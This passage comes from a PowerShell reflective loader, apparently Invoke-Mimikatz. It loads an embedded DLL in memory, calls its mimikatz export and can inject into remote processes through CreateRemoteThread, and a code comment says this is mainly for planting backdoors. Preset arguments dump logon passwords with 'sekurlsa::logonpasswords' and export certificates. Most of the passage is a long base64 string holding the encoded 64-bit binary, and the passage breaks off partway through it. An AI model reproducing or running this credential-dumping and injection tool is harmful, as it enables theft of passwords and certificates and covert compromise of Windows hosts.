			Throw "Unable to load PE, handle returned is NULL"
		}
		
		$PEHandle = $PELoadedInfo[0]
		$RemotePEHandle = $PELoadedInfo[1] #only matters if you loaded in to a remote process
		
		
		#Check if EXE or DLL. If EXE, the entry point was already called and we can now return. If DLL, call user function.
		$PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants
		if (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -eq [IntPtr]::Zero))
		{
			#########################################
			### YOUR CODE GOES HERE
			#########################################
                    Write-Verbose "Calling function with WString return type"
				    [IntPtr]$WStringFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "powershell_reflective_mimikatz"
				    if ($WStringFuncAddr -eq [IntPtr]::Zero)
				    {
					    Throw "Couldn't find function address."
				    }
				    $WStringFuncDelegate = Get-DelegateType @([IntPtr]) ([IntPtr])
				    $WStringFunc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WStringFuncAddr, $WStringFuncDelegate)
                    $WStringInput = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArgs)
				    [IntPtr]$OutputPtr = $WStringFunc.Invoke($WStringInput)
                    [System.Runtime.InteropServices.Marshal]::FreeHGlobal($WStringInput)
				    if ($OutputPtr -eq [IntPtr]::Zero)
				    {
				    	Throw "Unable to get output, Output Ptr is NULL"
				    }
				    else
				    {
				        $Output = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($OutputPtr)
				        Write-Output $Output
				        $Win32Functions.LocalFree.Invoke($OutputPtr);
				    }
			#########################################
			### END OF YOUR CODE
			#########################################
		}
		#For remote DLL injection, call a void function which takes no parameters
		elseif (($PEInfo.FileType -ieq "DLL") -and ($RemoteProcHandle -ne [IntPtr]::Zero))
		{
			$VoidFuncAddr = Get-MemoryProcAddress -PEHandle $PEHandle -FunctionName "VoidFunc"
			if (($VoidFuncAddr -eq $null) -or ($VoidFuncAddr -eq [IntPtr]::Zero))
			{
				Throw "VoidFunc couldn't be found in the DLL"
			}
			
			$VoidFuncAddr = Sub-SignedIntAsUnsigned $VoidFuncAddr $PEHandle
			$VoidFuncAddr = Add-SignedIntAsUnsigned $VoidFuncAddr $RemotePEHandle
			
			#Create the remote thread, don't wait for it to return.. This will probably mainly be used to plant backdoors
			$RThreadHandle = Invoke-CreateRemoteThread -ProcessHandle $RemoteProcHandle -StartAddress $VoidFuncAddr -Win32Functions $Win32Functions
		}
		
		#Don't free a library if it is injected in a remote process
		if ($RemoteProcHandle -eq [IntPtr]::Zero)
		{
			Invoke-MemoryFreeLibrary -PEHandle $PEHandle
		}
		else
		{
			#Just delete the memory allocated in PowerShell to build the PE before injecting to remote process
			$Success = $Win32Functions.VirtualFree.Invoke($PEHandle, [UInt64]0, $Win32Constants.MEM_RELEASE)
			if ($Success -eq $false)
			{
				Write-Warning "Unable to call VirtualFree on the PE's memory. Continuing anyways." -WarningAction Continue
			}
		}
		
		Write-Verbose "Done!"
	}

	Main
}

#Main function to either run the script locally or remotely
Function Main
{
	if (($PSCmdlet.MyInvocation.BoundParameters["Debug"] -ne $null) -and $PSCmdlet.MyInvocation.BoundParameters["Debug"].IsPresent)
	{
		$DebugPreference  = "Continue"
	}
	
	Write-Verbose "PowerShell ProcessID: $PID"
	

	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
	{
		$ExeArgs = "sekurlsa::logonpasswords exit"
	}
    elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
    {
        $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
    }
    else
    {
        $ExeArgs = $Command
    }

    [System.IO.Directory]::SetCurrentDirectory($pwd)

	
    $PEBytes64 = "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